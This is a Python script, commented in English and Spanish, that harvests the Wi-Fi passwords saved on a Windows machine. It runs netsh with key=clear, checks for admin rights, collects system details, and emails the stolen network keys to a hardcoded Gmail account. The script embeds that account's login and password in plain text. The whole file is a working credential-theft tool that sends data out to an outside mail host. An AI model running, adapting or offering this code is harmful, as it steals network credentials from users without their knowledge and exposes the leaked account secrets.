#!/usr/bin/env python

# This program only works for windows operating systems that are in english or spanish

# Este programa solo funciona para sistemas operativos windows que estan en el idioma ingles o español 
# Antes de usarlo tendra que configurar un cambio en su correo electronico. 
# Entre a la pagina https://myaccount.google.com/lesssecureapps?pli=1 y presione en el 'boton de encendido y apagado' y asegurese
# de que este en azul (prendido)

import subprocess, re, smtplib, locale, os, platform
default_lang = locale.getdefaultlocale()[0]
operating_system = ""
operating_bit_system = ""
operating_system_dist = ""
ip_host = ""

try:
    operating_system = os.uname()[0]
    operating_bit_system = os.uname()[4]
    operating_system_dist = os.uname()[3]
except AttributeError:
    operating_system = platform.uname()[0]
    operating_bit_system = platform.uname()[4]
    operating_system_dist = platform.uname()[3]

if operating_bit_system == "x86_64":
    operating_bit_system = "64"
elif operating_bit_system == "x86":
    operating_bit_system = "32"

default_message = "The Default Language of the Operating System is {} \n" \
              "The Operating System that is being used is {} \n " \
              "The Distribution of the Operating System is {} \n " \
              "The Operating System is {} bit \n " \
                  "The IP Address of the host is {}".format(default_lang, operating_system, operating_system_dist, operating_bit_system, ip_host)

english_languages = ["en", "en_AU", "en_BZ", "en_CA", "en_IE", "en_JM", "en_NZ", "en_ZA", "en_TT", "en_GB", "en_US"]
spanish_languages = ["es_AR", "es_BO", "es_CL", "es_CO", "es_CR", "es_DO", "es_EC", "es_SV", "es_GT", "es_HN", "es_MX", "es_NI", "es_PA", "es_PY", "es_PE", "es", "es_UY", "es_VE", "es_US", "es_ES"]

regex_code_password_spanish = "(?:Contenido\sde\sla\sclave\s*:\s)(\w*)(?:[^rn])"
regex_code_network_spanish = "(?:usuarios\s*:\s)(.*)"

regex_code_password_english = "(?:Key\sContent\s*:\s)(\w*)(?:[^rn])"
regex_code_network_english = "(?:Profile\s*:\s)(.*)"

email = "vlackvincent936@gmail.com"
password = "Bitter@Seeds**7"

data_list = {}

command_list_networks = "netsh wlan show profiles"
command_list_users = "net user"
administrators = []

active_user = os.getlogin()

def checkUserAdmin(language):
    regex_code = ""
    is_admin = False
    command_list_users_result = subprocess.check_output(command_list_users)
    if language == "spanish":
        regex_code = "(?:Administrador\s*)(.*)(.*)"
    elif language == "english":
        regex_code = "(?:Administrator\s*)(.*)(.*)"

    admins = re.findall(regex_code, str(command_list_users_result))

    for admin in admins:
        administrators.append(admin[0].split()[1])

    if active_user in administrators:
        is_admin = True

    return is_admin

def send_email(email, password, message):
    server = smtplib.SMTP_SSL("smtp.gmail.com")
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def sendInfo(email, email_password, network_name, network_password):
    send_email(email, email_password, "The password of Network {} is {}".format(network_name, network_password))

def returnPassword(language, network_element):
    network_regex = re.search("(\w*)(?:[^rn])", network_element)
    network_name = str(network_regex.group(1))
    password_show_command = "netsh wlan show profile {} key=clear".format(network_name)
    password_show_command_result = subprocess.check_output(password_show_command, shell=True)
    regex = ""
    if language == "spanish":
        regex = regex_code_password_spanish

    elif language == "english":
        regex = regex_code_password_english

    password_result = re.search(regex, str(password_show_command_result))
    actual_password = password_result.group(1)
    data_list[network_name] = actual_password


# Plan B
# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
def abortLang():
    send_email(email, password, "The program did not recognize the language the operating system uses. Code execution\n"
                                "aborted. Code Execution Aborted !")

def abortAdmin():
    send_email(email, password, "The user is not an administrator. Code Execution Aborted. Code Execution Aborted !")
# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

saved_networks = subprocess.check_output(command_list_networks, shell=True)

if default_lang in spanish_languages:
    if checkUserAdmin("spanish"):
        ip_regex = "(?:Dirección\sIPv4\W*)(\d*.\d*.\d*.\d*)"
        ip_command_result = subprocess.check_output("ipconfig", shell=True)
        ip_host = re.search(ip_regex, ip_command_result).group(1)
        network_list = re.findall(regex_code_network_spanish, str(saved_networks))
        for network in network_list:
            returnPassword("spanish", network)

        for data_set in data_list:
            sendInfo(email, password, data_set, data_list[data_set])
    else:
        abortAdmin()

elif default_lang in english_languages:
    if checkUserAdmin("english"):
        network_list = re.findall(regex_code_network_english, saved_networks)
        for network in network_list:
            returnPassword("english", network)

        for data_set in data_list:
            sendInfo(email, password, data_set, data_list[data_set])
    else:
        abortAdmin()
else:
    abortLang()

send_email(email, email, default_message)
